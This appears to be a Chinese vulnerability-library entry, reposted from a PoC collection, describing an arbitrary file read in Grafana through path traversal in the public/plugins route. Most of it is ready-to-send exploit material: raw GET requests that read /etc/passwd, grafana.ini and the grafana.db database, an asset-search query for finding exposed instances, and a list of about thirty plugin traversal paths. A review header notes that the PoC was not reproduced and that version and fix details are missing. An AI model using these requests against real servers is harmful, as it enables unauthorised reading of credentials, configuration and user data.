---
source: "wy876 漏洞文库"
product: "Grafana/plugins 路径遍历"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Grafana存在任意文件读取漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：仅产品名，无版本或修复；要求实际存在所选插件及可读文件"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-9c77eadbd3d431593f859e15"
entity_id: "ve-9c77eadbd3d431593f859e15"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：仅产品名，无版本或修复；要求实际存在所选插件及可读文件

代码与实验材料：多插件与passwd/ini/db路径补充；空Host、GET却固定Content-Length2，未提供响应证明

来源证据范围：wy876和语雀原文

- **事实待核（1）**：缺主编号/范围导致看似新漏洞；依据：与43798相同public/plugins遍历，却无CVE及固定点。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **适用与权限边界（2）**：列表未经版本化且请求非完整；依据：插件列表混多代ID，不能认为全部默认安装；空Host和无body长度字段，重复第三章标题。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Grafana存在任意文件读取漏洞

# 一、漏洞描述
Grafana是一个开源的可视化和分析平台，一个通用的可视化工具。‘通用’意味着Grafana不仅仅适用于展示Prometheus下的监控数据，也同样适用于一些其他的数据可视化需求。Grafana存在任意文件读取漏洞

# 二、影响版本
Grafana

# 三、资产测绘
```plain
app="Grafana"
```


# 三、漏洞复现
```plain
GET /public/plugins/gettingstarted/../../../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: 
Content-Length: 2
```


读取配置文件

```plain
GET /public/plugins/gettingstarted/../../../../../../../../../../../../../../../etc/grafana/grafana.ini HTTP/1.1
Host: 
Content-Length: 2
```

数据库

```plain
GET /public/plugins/gettingstarted/../../../../../../../../../../../../../../../var/lib/grafana/grafana.db HTTP/1.1
Host: 
Content-Length: 2
```

其他读取路径

```plain
/public/plugins/alertGroups/../../../../../../../../etc/passwd
/public/plugins/alertlist/../../../../../../../../etc/passwd
/public/plugins/annolist/../../../../../../../../etc/passwd
/public/plugins/barchart/../../../../../../../../etc/passwd
/public/plugins/bargauge/../../../../../../../../etc/passwd
/public/plugins/canvas/../../../../../../../../etc/passwd
/public/plugins/dashlist/../../../../../../../../etc/passwd
/public/plugins/debug/../../../../../../../../etc/passwd
/public/plugins/gauge/../../../../../../../../etc/passwd
/public/plugins/geomap/../../../../../../../../etc/passwd
/public/plugins/gettingstarted/../../../../../../../../etc/passwd
/public/plugins/graph/../../../../../../../../etc/passwd
/public/plugins/heatmap/../../../../../../../../etc/passwd
/public/plugins/histogram/../../../../../../../../etc/passwd
/public/plugins/live/../../../../../../../../etc/passwd
/public/plugins/logs/../../../../../../../../etc/passwd
/public/plugins/news/../../../../../../../../etc/passwd
/public/plugins/nodeGraph/../../../../../../../../etc/passwd
/public/plugins/piechart/../../../../../../../../etc/passwd
/public/plugins/pluginlist/../../../../../../../../etc/passwd
/public/plugins/stat/../../../../../../../../etc/passwd
/public/plugins/state-timeline/../../../../../../../../etc/passwd
/public/plugins/status-history/../../../../../../../../etc/passwd
/public/plugins/table/../../../../../../../../etc/passwd
/public/plugins/table-old/../../../../../../../../etc/passwd
/public/plugins/text/../../../../../../../../etc/passwd
/public/plugins/timeseries/../../../../../../../../etc/passwd
/public/plugins/welcome/../../../../../../../../etc/passwd
/public/plugins/xychart/../../../../../../../../etc/passwd
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qkw3xd9rwpw26kmc>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
